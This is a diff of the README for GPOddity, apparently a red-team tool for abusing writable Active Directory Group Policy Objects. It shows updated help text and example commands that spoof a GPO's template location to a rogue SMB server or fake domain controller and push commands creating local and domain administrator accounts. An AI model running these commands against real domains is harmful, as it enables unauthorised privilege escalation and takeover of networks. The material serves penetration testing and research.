@@ -27,65 +27,85 @@ $ python3 -m pip install -r requirements.txt
 
 ```
 $ python3 gpoddity.py --help
-                                                                                                                                                                                                                   
- Usage: gpoddity.py [OPTIONS]                                                                                                                                                                                      
-                                                                                                                                                                                                                   
-╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ --help          Show this message and exit.                                                                                                                                                                     │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-╭─ General options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ *  --domain               TEXT  The target domain [default: None] [required]                                                                                                                                    │
-│ *  --gpo-id               TEXT  The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') [default: None] [required]                                                │
-│ *  --username             TEXT  The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$') [default: None] [required]                       │
-│    --password             TEXT  The password of the user having write permissions on the GPO AD object [default: None]                                                                                          │
-│    --hash                 TEXT  The NTLM hash of the user having write permissions on the GPO AD object, with the format 'LM:NT' [default: None]                                                                │
-│    --dc-ip                TEXT  [Optional] The IP of the domain controller if the domain name can not be resolved. [default: None]                                                                              │
-│    --ldaps                      [Optional] Use LDAPS on port 636 instead of LDAP                                                                                                                                │
-│    --verbose                    [Optional] Enable verbose output                                                                                                                                                │
-│    --no-smb-server              [Optional] Disable the smb server feature. GPOddity will only generate a malicious GPT, spoof the GPO location, wait, and cleanup                                               │
-│    --just-clean                 [Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or         │
-│                                 ungraceful exit                                                                                                                                                                 │
-│    --clean-file           TEXT  [Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or absolute path     │
-│                                 [default: None]                                                                                                                                                                 │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-╭─ Malicious Group Policy Template generation options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ --command           TEXT             The command that should be executed through the malicious GPO [default: None]                                                                                              │
-│ --powershell                         [Optional] Use powershell instead of cmd for command execution                                                                                                             │
-│ --gpo-type          [user|computer]  [Optional] The type of GPO that we are targeting. Can either be 'user' or 'computer' [default: GPOTypes.computer]                                                          │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-╭─ Group Policy Template location spoofing options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ --rogue-smbserver-ip           TEXT  The IP address or DNS name of the server that will host the spoofed malicious GPO. If using the GPOddity smb server, this should be the IP address of the current host on  │
-│                                      the internal network (for instance, 192.168.58.101)                                                                                                                        │
-│                                      [default: None]                                                                                                                                                            │
-│ --rogue-smbserver-share        TEXT  The name of the share that will serve the spoofed malicious GPO (for instance, 'synacktiv'). If you are running the embedded SMB server, do NOT provide names including    │
-│                                      'SYSVOL' or 'NETLOGON' (protected by UNC path hardening by default)                                                                                                        │
-│                                      [default: None]                                                                                                                                                            │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-╭─ GPOddity smb server options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ --machine-name        TEXT  [Optional] The name of a valid domain machine account, that will be used to perform Netlogon authentication (for instance, SRV01$). If omitted, will use the user specified with    │
-│                             the --username option, and assume that it is a valid machine account                                                                                                                │
-│                             [default: None]                                                                                                                                                                     │
-│ --machine-pass        TEXT  [Optional] The password of the machine account if specified with --machine-name [default: None]                                                                                     │
-│ --machine-hash        TEXT  [Optional] The NTLM hash of the machine account if specified with --machine-name, with the format 'LM:NT' [default: None]                                                           │
-│ --comment             TEXT  [Optional] Share's comment to display when asked for shares [default: None]                                                                                                         │
-│ --interface           TEXT  [Optional] The interface on which the GPOddity smb server should listen [default: 0.0.0.0]                                                                                          │
-│ --port                TEXT  [Optional] The port on which the GPOddity smb server should listen [default: 445]                                                                                                   │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+                                                                                                                                                                                                
+ Usage: gpoddity.py [OPTIONS]                                                                                                                                                                   
+                                                                                                                                                                                                
+╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ --help          Show this message and exit.                                                                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─ General options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ *  --domain            TEXT  The target domain [default: None] [required]                                                                                                                    │
+│ *  --gpo-id            TEXT  The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') [default: None] [required]                                │
+│ *  --username          TEXT  The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$') [default: None] [required]       │
+│    --password          TEXT  The password of the user having write permissions on the GPO AD object [default: None]                                                                          │
+│    --hash              TEXT  The NTLM hash of the user having write permissions on the GPO AD object, with the format 'LM:NT' [default: None]                                                │
+│    --dc-ip             TEXT  [Optional] The IP of the domain controller if the domain name can not be resolved. [default: None]                                                              │
+│    --ldaps                   [Optional] Use LDAPS on port 636 instead of LDAP                                                                                                                │
+│    --verbose                 [Optional] Enable verbose output                                                                                                                                │
+│    --just-clean              [Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete         │
+│                              exploitation or ungraceful exit                                                                                                                                 │
+│    --clean-file        TEXT  [Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or   │
+│                              absolute path                                                                                                                                                   │
+│                              [default: None]                                                                                                                                                 │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─ Malicious Group Policy Template generation options ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ --command           TEXT             The command that should be executed through the malicious GPO [default: None]                                                                           │
+│ --powershell                         [Optional] Use powershell instead of cmd for command execution                                                                                          │
+│ --gpo-type          [user|computer]  [Optional] The type of GPO that we are targeting. Can either be 'user' or 'computer' [default: computer]                                                │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─ Group Policy Template location spoofing options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ --rogue-smbserver-ip           TEXT  The IP address or DNS name of the server that will host the spoofed malicious GPO. If using the GPOddity smb server, this should be the IP address of   │
+│                                      the current host on the internal network (for instance, 192.168.58.101)                                                                                 │
+│                                      [default: None]                                                                                                                                         │
+│ --rogue-smbserver-share        TEXT  The name of the share that will serve the spoofed malicious GPO (for instance, 'synacktiv'). If you are running the embedded SMB server, do NOT provide │
+│                                      names including 'SYSVOL' or 'NETLOGON' (protected by UNC path hardening by default)                                                                     │
+│                                      [default: None]                                                                                                                                         │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─ SMB server options ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ --machine-name        TEXT                       [Optional] The name of a valid domain machine account, that will be used to perform Netlogon authentication (for instance, SRV01$). If      │
+│                                                  omitted, will use the user specified with the --username option, and assume that it is a valid machine account                              │
+│                                                  [default: None]                                                                                                                             │
+│ --machine-pass        TEXT                       [Optional] The password of the machine account if specified with --machine-name [default: None]                                             │
+│ --machine-hash        TEXT                       [Optional] The NTLM hash of the machine account if specified with --machine-name, with the format 'LM:NT' [default: None]                   │
+│ --comment             TEXT                       [Optional] Share's comment to display when asked for shares [default: None]                                                                 │
+│ --interface           TEXT                       [Optional] The interface on which the GPOddity smb server should listen [default: 0.0.0.0]                                                  │
+│ --port                TEXT                       [Optional] The port on which the GPOddity smb server should listen [default: 445]                                                           │
+│ --smb-mode            [embedded|forwarded|none]  [Optional] 'Embedded' SMB server will host an SMB server on this machine. 'Forwarded' will forward SMB traffic to a fake Domain Controller  │
+│                                                  (requires a machine account associated with a DNS record pointing to the attacker machine. Generated GPT should be uploaded on the fake     │
+│                                                  DC). 'None' will not host any SMB server (generated GPT should be uploaded on a writable SMB share in the domain)                           │
+│                                                  [default: embedded]                                                                                                                         │
+│ --empty-gpo                                      [Optional] By default, GPOddity will clone the target GPO and add a malicious immediate task. If this flag is specified, an empty GPO will  │
+│                                                  be used instead of a clone of the legitimate one (can be useful for some edge cases in which immediate tasks will not integrate well with   │
+│                                                  existing GPOs)                                                                                                                              │
+│ --attacker-ip         TEXT                       [Optional] The IP of the attacker machine in the internal network (required for smb-mode 'forwarded')                                       │
+│ --forwarded-ip        TEXT                       [Optional] The IP of the fake DC to which SMB traffic will be forwarded (required for smb-mode 'forwarded')                                 │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
 ```
 
 # Examples
 
 Below are some example commands taken from the article linked above.
 
-> Exploiting a Computer GPO to add a local administrator (running the embedded SMB server).
+> Exploiting a Computer GPO to add a local administrator. SMB mode is 'embedded': GPOddity will host the GPT on its embedded SMB server.
 ```
-$ python3 gpoddity.py --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --domain 'corp.com' --username 'GPODDITY$' --password '[...]' --command 'net user synacktiv_gpoddity Password123! /add && net localgroup administrators synacktiv_gpoddity /add' --rogue-smbserver-ip '192.168.58.101' --rogue-smbserver-share 'synacktiv'
+$ python3 gpoddity.py --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --domain 'corp.com' --username 'GPODDITY$' \
+--password '[...]' --command 'net user synacktiv_gpoddity Password123! /add && net localgroup administrators synacktiv_gpoddity /add' \
+--rogue-smbserver-ip '192.168.58.101' --rogue-smbserver-share 'synacktiv'
 ```
 
 
-> Exploiting a User GPO to add a domain administrator (no embedded SMB server).
+> Exploiting a User GPO to add a local administrator. SMB mode is 'none': GPOddity will create the malicious GPT, and you will then have to upload it to a writable domain share
 ```
-$ python3 gpoddity.py --gpo-id '7B36419B-B566-46FA-A7B7-58CA9030A604' --gpo-type 'user' --no-smb-server --domain 'corp.com' --username 'GPODDITY$' --password '[...]' --command 'net user user_gpo Password123! /add /domain && net group "Domain Admins" user_gpo /ADD /DOMAIN' --rogue-smbserver-ip '192.168.58.102' --rogue-smbserver-share 'synacktiv'
+$ python3 gpoddity.py --gpo-id '7B36419B-B566-46FA-A7B7-58CA9030A604' --gpo-type 'user' --smb-mode 'none' --domain 'corp.com' --username 'GPODDITY$' \
+--password '[...]' --command 'net user user_gpo Password123! /add /domain && net group "Domain Admins" user_gpo /ADD /DOMAIN' \
+ --rogue-smbserver-ip '192.168.58.102' --rogue-smbserver-share 'synacktiv'
+```
+
+> Exploiting a User GPO to add a local administrator. SMB mode is 'forwarded': you will have to add a DNS record pointing to GPOddity's machine, associated with a machine account. You will have to provide the IP address of a fake DC whose password is synchronized with the machine account, and upload the malicious GPT to said fake DC. For more information about this mode, see my Black Alps 2024 talk (available soon).
+```
+$ python3 gpoddity.py --gpo-id 'B12968FB-EEEE-404A-A583-101A2E249BF9' --domain 'corp.com' --username 'lowpriv' \
+--password '[...]' --command 'whoami > C:\poc_forwarded.txt' --gpo-type 'user' --rogue-smbserver-ip 'gpoddity.corp.com' \
+--rogue-smbserver-share 'synacktiv' --smb-mode 'forwarded' --attacker-ip '192.168.123.16' --forwarded-ip '192.168.125.245'
 ```
 
 # About cleaning
